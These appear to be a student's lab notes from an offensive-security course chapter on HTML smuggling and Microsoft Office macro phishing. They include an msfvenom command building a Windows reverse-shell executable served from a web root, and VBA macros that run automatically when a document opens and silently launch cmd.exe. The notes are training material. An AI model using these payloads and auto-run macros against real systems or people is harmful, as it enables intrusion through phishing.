# HTML smuggling

remember to use staged payload instead of non staged ones in meterpreter.

finally used 

```
┌──(kali㉿kali)-[~/codeplay/pen300/book/chapter3]
└─$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.6.12 LPORT=4444 -f exe -o /var/www/html/msfstaged.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: /var/www/html/msfstaged.exe
                                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~/codeplay/pen300/book/chapter3]
└─$ base64 /var/www/html/msfstaged.exe

```
check the code : using new_html.html

### 3.1.3.1 Exercises
1. Repeat the HTML smuggling to trigger a download of a Meterpreter payload in a file format 
of your choosing.

2. Modify the smuggling code to also use the window.navigator.msSaveBlob62,63 method to 
make the technique work with Microsoft Edge as well.

The explot works in msedge also without any change.

# phishing with microsoft office

installing microsoft office 2016 from : `https://office-2016.fileplanet.com/download` - not verified.

### 3.2.1.1 Exercise
1. Install Microsoft Office on your Windows 10 client VM
done

## introduction to vba

creating a macro - view > macros

Leveraging existing methods like Document_Open() and AutoOpen()


```
Sub ss()
'
' ss Macro
'
'

Dim myLong As Long

myLong = 1

If myLong < 5 Then
    MsgBox ("True")
Else
    MsgBox ("False")
End If

End Sub

```

macro for calling cmd.exe

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    MsgBox ("This is a macro test")
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub

```

Remember to save docx macro compatible.

## 3.2.2.1 Exercises
1. Experiment with VBA programming basics by creating a small macro that prints the current 
username and computer name 5 times using the Environ$ function.

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim iCnt As Integer
    Dim sEnvVariable As String
    
    MsgBox Environ("USERNAME") + Environ("USERNAME")
     
End Sub

```

2. Create an Excel macro that runs when opening an Excel spreadsheet and executes cmd.exe 
using Workbook_Open

```
Sub Workbook_Open()
    myMacro

End Sub


Sub myMacro()
    MsgBox ("yello")
End Sub

```
# Let Powershell help us

Powershell is rendered on th efly using .NET framework









